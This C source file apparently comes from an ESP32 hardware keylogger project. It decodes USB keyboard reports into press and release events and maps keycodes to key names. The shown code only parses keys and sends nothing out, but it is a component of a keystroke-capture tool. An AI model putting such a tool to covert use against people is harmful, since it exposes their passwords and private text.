#include <stdio.h>
#include <stdbool.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"

#include "Decoder/hid_queue/hid_queue.h"
#include "keyboard_decode.h"
#include "KeyCodes.h"
#include "configKeylogger.h"

#define get_bit_u(dat, i) ((dat & (0x0001 << (i - 1))) ? 1 : 0)
#define clr_bit_u(dat, i) ((dat) &= (~(0x0001 << (i - 1))))
#define set_bit_u(dat, i) ((dat) |= (0x0001 << (i - 1)))

void keyboard_send_modifter_key_state(hid_queue_t hid_queue, keyboard_data_t oldkeydata, keyboard_data_t newkeydata)
{
    hid_event_t hid_event;
    int key_type = 0;
    for (int m = 1; m <= 8; m++)
    {
        if (get_bit_u(newkeydata.modifier[0], m) != get_bit_u(oldkeydata.modifier[0], m))
        {
            key_type = get_bit_u(newkeydata.modifier[0], m) > get_bit_u(oldkeydata.modifier[0], m) ? KEY_STATE_PRESSED : KEY_STATE_RELEASED;
            switch (m)
            {
            case 1:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_LCTRL);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 2:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_LSHIFT);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 3:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_LALT);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 4:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_LMETA);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 5:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_RCTRL);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 6:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_RSHIFT);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 7:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_RALT);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            case 8:
                hid_event_build(&hid_event, KEY_TYPE_MODIFTER, key_type, KEY_MOD_RMETA);
                hid_queue_send(hid_queue, &hid_event, 0);
                break;
            default:
                break;
            }
        }
    }
}
void keyboard_send_normal_key_state(hid_queue_t hid_queue, keyboard_data_t oldkeydata, keyboard_data_t newkeydata)
{
    int i = 0, j = 0;
    bool flag = false;
    hid_event_t hid_event;

    while (newkeydata.key[i] != 0x00 && i <= 5)
    // while (i <= 5)
    {
        while (oldkeydata.key[j] != 0x00 && j <= 5)
        // while (j <= 5)
        {
            if (newkeydata.key[i] == oldkeydata.key[j])
            {
                flag = true;
                break;
            }
            j += 1;
        }
        if (flag == false)
        {
            hid_event_build(&hid_event, KEY_TYPE_NORMAL, KEY_STATE_PRESSED, newkeydata.key[i]);
            hid_queue_send(hid_queue, &hid_event, 0);
        }
        j = 0;
        flag = false;
        i += 1;
    }
    i = 0, j = 0, flag = false;

    while (oldkeydata.key[i] != 0x00 && i <= 5)
    // while (i <= 5)
    {
        while (newkeydata.key[j] != 0x00 && j <= 5)
        // while (j <= 5)
        {
            if (oldkeydata.key[i] == newkeydata.key[j])
            {
                flag = true;
                break;
            }
            j += 1;
        }
        if (flag == false)
        {
            hid_event_build(&hid_event, KEY_TYPE_NORMAL, KEY_STATE_RELEASED, oldkeydata.key[i]);
            hid_queue_send(hid_queue, &hid_event, 0);
        }
        j = 0;
        flag = false;
        i += 1;
    }
}
void keyboard_send_all_key_pressed(hid_queue_t hid_queue, keyboard_data_t oldkeydata, keyboard_data_t newkeydata)
{
    keyboard_send_modifter_key_state(hid_queue, oldkeydata, newkeydata);
    keyboard_send_normal_key_state(hid_queue, oldkeydata, newkeydata);
}

keylogger_err_t keyboard_key_code_to_ascii(char key_code, int key_type, char *out_key_name, int length)
{
    if (key_type == KEY_TYPE_MODIFTER)
    {
        if (key_code >= KEY_MOD_LCTRL && key_code <= KEY_MOD_RMETA)
        {
            memset(out_key_name, 0, length);
            strcpy(out_key_name, modifter_keys_name[(int)key_code]);
            return KEYLOGGER_SUCCESS;
        }
        else
        {
            return KEYLOGGER_FAIL;
        }
    }
    if (key_type == KEY_TYPE_NORMAL)
    {
        if (key_code >= KEY_A && key_code <= KEY_CAPSLOCK)
        {
            memset(out_key_name, 0, length);
            strcpy(out_key_name, normal_keys_name[(int)key_code][0]);
            return KEYLOGGER_SUCCESS;
        }
        else
        {
            return KEYLOGGER_FAIL;
        }
    }
    return KEYLOGGER_FAIL;
}